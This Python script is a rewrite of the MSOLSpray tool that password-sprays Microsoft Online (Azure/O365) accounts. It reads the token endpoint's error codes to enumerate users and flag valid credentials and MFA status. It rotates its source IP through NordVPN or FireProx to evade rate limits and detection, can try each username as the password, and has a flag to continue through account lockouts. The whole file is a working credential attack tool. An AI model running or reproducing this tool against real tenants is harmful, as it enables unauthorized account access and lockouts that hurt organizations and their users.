import requests
import argparse
import time
import datetime
import sys
from nordvpn_switcher import initialize_VPN,terminate_VPN
from utils import configure_logger, safe_rotate_vpn, get_public_ip, init_db, log_event, has_user_password_been_tested, has_user_been_pwned

description = """
This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him!

This script will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
"""

epilog = """
EXAMPLE USAGE:
This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    python3 MSOLSpray.py --userlist ./userlist.txt --password Winter2020

This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
    python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
"""
parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)

parser.add_argument("-U", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
parser.add_argument("-p", "--password", required=True, help="A single password that will be used to perform the password spray. (Required)")
parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password", default=False)
parser.add_argument("-s", "--sleep", default=0, type=int, help="Sleep this many seconds between tries")
parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
parser.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
parser.add_argument('--skip-tested', action='store_true', help="Skip user:password already tried and logged in the DB")
parser.add_argument('--ignore-success', action='store_true', help="Skip user already pwned in the DB")

args = parser.parse_args()

password = args.password
url = args.url
force = args.force
verbose = args.verbose
sleep = args.sleep
vpn = args.vpn
userAsPass = args.userAsPass

usernames = []
with open(args.userlist, "r") as userlist:
    usernames = userlist.read().splitlines()

username_count = len(usernames)

global LOGGER
LOGGER = configure_logger(args.verbose, "MSOL")
init_db("events.db")
LOGGER.info(f"There are {username_count} users in total to spray,")
LOGGER.info("Now spraying Microsoft Online.")
LOGGER.info(f"Current date and time: {time.ctime()}")

username_counter = 0
lockout_counter = 0
lockout_question = False

if vpn:
        try:
            initialize_VPN(save=1, area_input=['France,Germany,Netherlands,United Kingdom'])
        except Exception as e:
            LOGGER.warning(f"[VPN] initialize_VPN failed at start: {e}")

        # --- NEW: capture initial IP and exit if unavailable ---
        prev_ip = get_public_ip(timeout=5, retries=2)
        if not prev_ip:
            LOGGER.critical("[VPN] Could not determine initial public IP after VPN init. Exiting.")
            try:
                terminate_VPN()
            except Exception as e:
                LOGGER.warning(f"[VPN] terminate_VPN failed while exiting: {e}")
            sys.exit(1)
        else:
            LOGGER.info(f"[VPN] Initial public IP: {prev_ip}")

for username in usernames:
    if args.ignore_success:
        try:
            already = has_user_been_pwned(username)
        except Exception as e:
            LOGGER.warning(f"[DB] Error during the user pwned check: {e}")
            already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
        if already:
            LOGGER.info(f"[SKIP] {username} already pwned — skipping.")
            continue
        
    if args.skip_tested:
        try:
            already = has_user_password_been_tested(username, password)
        except Exception as e:
            LOGGER.warning(f"[DB] Error during the user:password check: {e}")
            already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
        if already:
            LOGGER.info(f"[SKIP] {username}:{password} already tested — skipping.")
            continue

    if username_counter>0 and sleep>0:        
        time.sleep(sleep)
    
    if vpn and username_counter%15==0:
        new_ip = safe_rotate_vpn(prev_ip=prev_ip, rotate_retries=4)
        if new_ip:
            prev_ip = new_ip
            LOGGER.debug(f"[VPN] Using IP {prev_ip}")
        else:
            LOGGER.warning("[VPN] Rotation failed — exiting")
            sys.exit(1)

    username_counter += 1
    LOGGER.info(f"{username_counter} of {username_count} users tested")

    if userAsPass:
        body = {
        'resource': 'https://graph.windows.net',
        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
        'client_info': '1',
        'grant_type': 'password',
        'username': username,
        'password': username.split('@')[0],
        'scope': 'openid',
    }
    else:
        body = {
            'resource': 'https://graph.windows.net',
            'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
            'client_info': '1',
            'grant_type': 'password',
            'username': username,
            'password': password,
            'scope': 'openid',
        }

    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
    time_posted = datetime.datetime.now()
    ip = get_public_ip(timeout=5, retries=2)

    if r.status_code == 200:
        LOGGER.info(f"SUCCESS! {username} : {password}")
        log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="")
    else:
        resp = r.json()
        error = resp["error_description"]

        if "AADSTS50126" in error:
            LOGGER.error(f"ERROR!: Invalid username or password. Username: {username} could exist.")
            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50126")

        elif "AADSTS50128" in error or "AADSTS50059" in error:
            LOGGER.error(f"WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50128")
            
        elif "AADSTS50034" in error:
            LOGGER.error(f"WARNING! The user {username} doesn't exist.")
            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50034")
                        
        elif "AADSTS50079" in error or "AADSTS50076" in error:
            # Microsoft MFA response
            LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
            log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates MFA (Microsoft) is in use.")
            
        elif "AADSTS50158" in error:
            # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
            LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
            log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates conditional access (MFA: DUO or other) is in use.")
            
        elif "AADSTS50053" in error:
            # Locked out account or Smart Lockout in place
            LOGGER.error(f"WARNING! The account {username} appears to be locked.")
            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50053")
            lockout_counter += 1
            
        elif "AADSTS50057" in error:
            # Disabled account
            LOGGER.error(f"WARNING! The account {username} appears to be disabled.")
            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50057")
            
        elif "AADSTS50055" in error:
            # User password is expired
            LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The user's password is expired.")
            log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="AADSTS50055")
            
        else:
            # Unknown errors
            LOGGER.error(f"Got an error we haven't seen yet for user {username}")
            log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="Got an error we haven't seen yet for user.")
            LOGGER.error(error)
            


    # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
    if not force and lockout_counter == 10 and lockout_question == False:
        LOGGER.error("WARNING! Multiple Account Lockouts Detected!")
        LOGGER.info("10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?")
        yes = {'yes', 'y'}
        no = {'no', 'n', ''}
        lockout_question = True
        choice = "X"
        while(choice not in no and choice not in yes):
            choice = input("[Y/N] (default is N): ").lower()

        if choice in no:
            LOGGER.info("Cancelling the password spray.")
            LOGGER.info("NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.")
            break

        # else: continue even though lockout is detected

if vpn:
    terminate_VPN()
